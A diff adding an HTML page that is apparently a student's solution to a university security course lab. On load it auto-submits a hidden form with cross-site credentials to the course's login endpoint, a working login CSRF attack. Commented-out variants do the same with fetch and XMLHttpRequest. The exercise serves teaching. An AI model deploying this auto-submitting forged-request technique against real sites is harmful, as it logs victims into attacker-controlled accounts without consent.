@@ -1,0 +1,81 @@
+<!-- <script>
+    let data = {
+        username: "hi",
+        password: "hello"
+    }
+    fetch("https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4", {
+        method: 'POST',
+        body: JSON.stringify(data),
+    });
+</script> -->
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                console.log($("#postForm"));
+                $("#postForm").submit(function(event) {
+                    event.preventDefault();
+                    var url = "https://project2.eecs388.org/login?csrfdefense=0";
+                    $.ajax({
+                        type: "POST",
+                        url: url,
+                        data: $("#postForm").serialize(),
+                        xhrFields: {withCredentials: true},
+                    });
+                });
+                $("#postForm").submit();
+            }); 
+        </script>
+    </head>
+
+    <body>
+        <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+        <form name="f" id="postForm" target="dummyframe">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="l33th4x">
+        </form>
+           <!-- <script>
+            document.getElementById("postForm").addEventListener("submit", function(e) {
+                console.log(e);
+              var request = new XMLHttpRequest();
+              request.open('POST', url, true);
+              request.onload = function() { // request successful
+              // we can use server response to our request now
+                console.log(request.responseText);
+              };
+            
+              request.onerror = function() {
+                // request failed
+              };
+            
+              request.send(new FormData(e.target)); // create FormData from form that triggered event
+                e.preventDefault();
+            });
+            document.f.submit();
+            </script>  -->
+    </body>
+    
+</html>
+
+
+   
+
+<!-- <form name="f" method="post" id="postForm">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+</form>
+<script>
+let to_send = {}
+let data = new FormData(document.getElementById("postForm"))
+console.log(data);
+for (const key of data.keys()) {
+    to_send[key] = data[key]
+}
+fetch('https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4', {
+        method: 'POST',
+        body: JSON.stringify(to_send)
+    });
+</script> 
+    -->
